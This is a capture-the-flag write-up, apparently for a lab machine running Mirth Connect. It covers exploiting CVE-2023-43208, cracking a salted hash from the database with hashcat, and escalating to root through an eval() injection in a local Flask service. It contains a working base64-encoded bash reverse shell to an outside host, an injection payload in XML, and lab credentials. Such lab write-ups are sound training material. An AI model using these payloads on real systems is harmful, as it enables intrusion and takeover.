
### Nmap
```
nmap -sV -sC -vv 10.129.4.97

---OUTPUT---
Nmap scan report for 10.129.4.97
Host is up, received echo-reply ttl 63 (0.062s latency).
Scanned at 2026-02-24 03:56:34 EST for 17s
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDVuD7K78VPFJrRRqOF1sCo4+cr9vm+x+VG1KLHzsgeEp3WWH2MIzd0yi/6eSzNDprifXbxlBCdvIR/et0G0lKI=
|   256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILAfcF/jsYtk8PnokOcYPpkfMdPrKcKdjel2yqgNEtU3
80/tcp  open  http     syn-ack ttl 63 Jetty
|_http-favicon: Unknown favicon MD5: 62BE2608829EE4917ACB671EF40D5688
| http-methods: 
|   Supported Methods: GET HEAD TRACE OPTIONS
|_  Potentially risky methods: TRACE
|_http-title: Mirth Connect Administrator
443/tcp open  ssl/http syn-ack ttl 63 Jetty
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mirth-connect
| Issuer: commonName=Mirth Connect Certificate Authority
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-19T12:50:05
| Not valid after:  2075-09-19T12:50:05
| MD5:     c251 9050 6882 4177 9dbc c609 d325 dd54
| SHA-1:   3f2b a7d8 5c81 9ecf 6e15 cb6a fdc6 df02 8d9b 1179
| SHA-256: 4089 e438 bce4 1091 6edb cc45 32f3 f06e 9e3e e3e0 c476 bd62 e120 aabc 8e1d 30b4
| -----BEGIN CERTIFICATE-----
| MIIHDjCCBfagAwIBAgIHAs1vd37U6TANBgkqhkiG9w0BAQsFADAuMSwwKgYDVQQD
| DCNNaXJ0aCBDb25uZWN0IENlcnRpZmljYXRlIEF1dGhvcml0eTAgFw0yNTA5MTkx
| MjUwMDVaGA8yMDc1MDkxOTEyNTAwNVowGDEWMBQGA1UEAwwNbWlydGgtY29ubmVj
| dDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOcl1ZyZfUY55vGMEHQp
| Kv42F90HswreFnh1UZtrRTPBLZEG8Mp4dwsUSdnyZRjWliW/w9E7trGlt2kg9NmS
| 0aH1zwFbRMgO6RvlGH8Y3qSYK1Xz7vz4nq8dklfDQEeHkKOorxkjrHZ5nsIuotQ1
| rMNQ3IO6bGCrzozodanm1kvGADImobIqQg82NUG+lUf33ltW4DA8YosZebcOGtaz
| A0E3ZhEau3izPfhgTYOxYEw0+71uPK1iS1gMPgkZOSEOeatoER0l+tISNGujBwx6
| p0qEOVKuyD1ckPeLQ3W5tySooZHV7dAxtYP5bWEUWIpHWkNENL9hHa1HHu/0hFTh
| xxUCAwEAAaOCBEMwggQ/MIIDBAYDVR0jBIIC+zCCAveAggLzMIIC7zCCAdegAwIB
| AgIBATANBgkqhkiG9w0BAQsFADAuMSwwKgYDVQQDDCNNaXJ0aCBDb25uZWN0IENl
| cnRpZmljYXRlIEF1dGhvcml0eTAgFw0yNTA5MTkxMjUwMDVaGA8yMDc1MDkxOTEy
| NTAwNVowLjEsMCoGA1UEAwwjTWlydGggQ29ubmVjdCBDZXJ0aWZpY2F0ZSBBdXRo
| b3JpdHkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCx5tdSOdln2NVP
| 2ENEc4CQmkkY/1O64NLvBnWr+Zu8AWyzFRBiGceqIXnWIpKWO5xxSObqsMiS2uSL
| Cj3/sprvfX+mojkmrZvpIYDqTQoayWjdI/MAn76VBZrZ4tGyPKibM6msLC/PNeSV
| JtGneR0GtT1yB3VGYfSEOJeIJLa2+PcHERSg2b+xBsrsWmGqwTIwl6NG3MPczmUD
| xomVpz7EpMZFka4slmRT81W9lIpgXl/jVAgLFoZUQ0q7ta1E0WdfeWkjMf0qEF5s
| LSm4UjDRkq/+xR8eZ7K1NBQL+1sUlmyhnfJnTGfik13g0xfpH1WNWsaHbRi6G70M
| zQs51qrlAgMBAAGjFjAUMBIGA1UdEwEB/wQIMAYBAf8CAQAwDQYJKoZIhvcNAQEL
| BQADggEBAFB4ZKwCdqnPqNWZhEi4XRoQY0/5bG/td+XP8a3lyudHQR6+JG8W2/DG
| MreycjnadJCaMn/KfBHULtUgbnpsCSJHQG/xmBS9jeT8NUu2R87xKypU7F0r08A2
| T9bduARSWYAJLF8g3UVGhC1o5fU+t0j3zUVEGKHdlC2GioZV9Jg5e7BIo/iqrLcX
| D6QOBOi509oMLYN40ijI6Q4KT0x01oDemPuirqo6CVg4fKnVjBGdXeWGdsH9DZsK
| O5zpxT2DcNXtFn7WdI+0FlUn+1Az+rFzuQlDZfyUAxiYXtL4ZaOGYKNNjKCECquv
| pdO2OKdCcl6oCIBJfRGDnh2Q7FIqK5wwggEzBgNVHQ4EggEqBIIBJjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOcl1ZyZfUY55vGMEHQpKv42F90Hswre
| Fnh1UZtrRTPBLZEG8Mp4dwsUSdnyZRjWliW/w9E7trGlt2kg9NmS0aH1zwFbRMgO
| 6RvlGH8Y3qSYK1Xz7vz4nq8dklfDQEeHkKOorxkjrHZ5nsIuotQ1rMNQ3IO6bGCr
| zozodanm1kvGADImobIqQg82NUG+lUf33ltW4DA8YosZebcOGtazA0E3ZhEau3iz
| PfhgTYOxYEw0+71uPK1iS1gMPgkZOSEOeatoER0l+tISNGujBwx6p0qEOVKuyD1c
| kPeLQ3W5tySooZHV7dAxtYP5bWEUWIpHWkNENL9hHa1HHu/0hFThxxUCAwEAATAN
| BgkqhkiG9w0BAQsFAAOCAQEAKEQK8YNzAWgPB07ydf05p277ISLa2T+rWzQ2cCPD
| amgc1lCOHK0pEdNMI2z4J+iNdeXiPpuBVgvKId6I8ETLdA7foFRGklv6W6t4MjMY
| Pte8+PPkhKdwRVLzEj/tae427Ar8daDCvyFK/IhunhugyxfywHNj665V+bqPLBGw
| bgiV7+CQKpNOeADBeGbZpEGfQb+U+RkLCpjq7don698TdeBIPcIErzDgS8PDZ217
| Y0o4EU9gaX6U42cpvD/LLZ+e87GRxBlm9ivRA8QAE+yqo8GZtWvYveLkg+7qNcWB
| nWXyOijePyLYSHl4QHn3F4nTx2bO16KspRrDZsmiZGyEIw==
|_-----END CERTIFICATE-----
|_http-title: Mirth Connect Administrator
| http-methods: 
|   Supported Methods: GET HEAD TRACE OPTIONS
|_  Potentially risky methods: TRACE
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port 80
![[Pasted image 20260224035809.png]]

- left 2 lead to an sh file code being executed on an s3 bucket as well as a jnlp file downloaded.

- Access Secure site leads to login:
![[Pasted image 20260224040100.png]]

- I find an exploit : https://github.com/Pegasus0xx/CVE-2023-43208
- I use it to get a reverse shell:
```
make
./exploit https://10.129.4.97 10.10.16.150 9999

---OUTPUT---
[*] Checking target version...
[+] Target is vulnerable!
[*] Sending payload...
[+] Payload triggered successfully!
```
- I grab a shell:
![[Pasted image 20260224044523.png]]

- Looking at `/usr/local/mirthconnect/conf/mirth.properties` I find some DB credentials:
![[Pasted image 20260225042316.png]]

- I login to sql and find some creds:
```
mysql -u mirthdb -p
> MirthPass123!
> 
> show databases'
> use mc_bdd_prod;
> show tables;
> select * FROM PERSON;
> select * FROM PERSON_PASSWORD;

---OUTPUT---
+-----------+----------------------------------------------------------+---------------------+
| PERSON_ID | PASSWORD                                                 | PASSWORD_DATE       |
+-----------+----------------------------------------------------------+---------------------+
|         2 | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== | 2025-09-19 09:22:28 |
+-----------+----------------------------------------------------------+---------------------+
```
![[Pasted image 20260225042504.png]]
- Searching online we see mirth connect uses salted hashes for encryption (SHA-256)
	- We find the iterations to be 600000 here : https://forums.mirthproject.io/forum/mirth-connect/support/12320-how-to-do-the-message-encryption-in-mirth
	- or https://docs.nextgen.com/en-US/mirthc2ae-connect-by-nextgen-healthcare-user-guide-3281761/default-digest-algorithm-in-mirthc2ae-connect-4-4-62159
- Furthermore the hash seems be base64 encoded
- To decode we do :
```
echo 'u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==' | base64 -d | xxd -p -c 256
bbff8b0413949da762c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb
```
- I split the first 8 bytes (16 characters) and the remaining. Then a recoded it back to base64:
```
echo bbff8b0413949da7 | xxd -r -p | base64
---OUTPUT---
u/+LBBOUnac=

echo 62c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb | xxd -r -p | base64
---OUTPUT---
YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```
- Then join it back with the right hashcat format  (hashtype:iterations:salt:hash)
```
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```
- Then I crack it with hashcat:
```
hashcat -m 10900 hash /usr/share/wordlists/rockyou.txt --force

---OUTPUT---
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=:snowflake1
```
- I can now ssh into target as user `sedric`:
```
ssh sedric@10.129.5.19
> snowflake1
```
![[Pasted image 20260225055538.png]]
- I grab the user flag:
![[Pasted image 20260225055558.png]]

### Privilege Escalation
 - On linpeas I find an unusual file notif.py:
```
at /usr/local/bin/notif.py

---OUTPUT---
#!/usr/bin/env python3
"""
Notification server for added patients.
This server listens for XML messages containing patient information and writes formatted notifications to files in /var/secure-health/patients/.
It is designed to be run locally and only accepts requests with preformated data from MirthConnect running on the same machine.
It takes data interpreted from HL7 to XML by MirthConnect and formats it using a safe templating function.
"""
from flask import Flask, request, abort
import re
import uuid
from datetime import datetime
import xml.etree.ElementTree as ET, os

app = Flask(__name__)
USER_DIR = "/var/secure-health/patients/"; os.makedirs(USER_DIR, exist_ok=True)

def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # DOB format is DD/MM/YYYY
    try:
        year_of_birth = int(dob.split('/')[-1])
        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
            return "[INVALID_DOB]"
    except:
        return "[INVALID_DOB]"
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
    except Exception as e:
        return f"[EVAL_ERROR] {e}"

@app.route("/addPatient", methods=["POST"])
def receive():
    if request.remote_addr != "127.0.0.1":
        abort(403)
    try:
        xml_text = request.data.decode()
        xml_root = ET.fromstring(xml_text)
    except ET.ParseError:
        return "XML ERROR\n", 400
    patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")
    if patient is None:
        return "No <patient> tag found\n", 400
    id = uuid.uuid4().hex
    data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
    notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])
    path = os.path.join(USER_DIR,f"{id}.txt")
    with open(path,"w") as f:
        f.write(notification+"\n")
    return notification

if __name__=="__main__":
    app.run("127.0.0.1",54321, threaded=True)
```

- locally there is a port 54321 running which is here this xml data is checked. We can add a malicious code here to get a reverse shell.
- To do this I do port forwarding with my ssh connection :
```
ssh -L 54321:127.0.0.1:54321 sedric|10.129.5.19
> snowflake1
```
- Then locally I create a python script to generate a base64 encoded version of my payload to attach to the xml file. This xml file's payload takes this base64 encoded data and decodes it giving us the malicious payload which then executes to get our reverse shell on our netcat lsitener.
- Python code:
```
#!/usr/bin/env python3
import base64

# Your reverse shell command (edit this)
cmd = "/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.150/9999 0>&1'"

# Base64 encode
encoded = base64.b64encode(cmd.encode()).decode()

# Build Python eval injection (NO spaces, NO commas)
payload = "{__import__('os').system(__import__('base64').b64decode('" + encoded + "').decode())}"

# Build XML
xml = f"""<?xml version="1.0"?>
<patient>
<firstname>{payload}</firstname>
<lastname>Doe</lastname>
<sender_app>Test</sender_app>
<timestamp>20240101</timestamp>
<birth_date>01/01/1990</birth_date>
<gender>M</gender>
</patient>
"""

print(xml)

```

- Executing it gives us the xml data which is copied into an xml file `test.xml`
```
python3 payload.py

---OUTPUT---
<?xml version="1.0"?>
<patient>
<firstname>{__import__('os').system(__import__('base64').b64decode('L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjE1MC85OTk5IDA+JjEn').decode())}</firstname>
<lastname>Doe</lastname>
<sender_app>Test</sender_app>
<timestamp>20240101</timestamp>
<birth_date>01/01/1990</birth_date>
<gender>M</gender>
</patient>
```

- I copy the output to `test.xml` and send a curl command to the endpoint:
```
curl -X POST http://127.0.0.1:54321/addPatient \
  -H "Content-Type: application/xml" \
  --data-binary @payload.xml
```
- I grab a shell on my listener as root:
![[Pasted image 20260225083405.png]]

- I grab the root flag:
![[Pasted image 20260225083450.png]]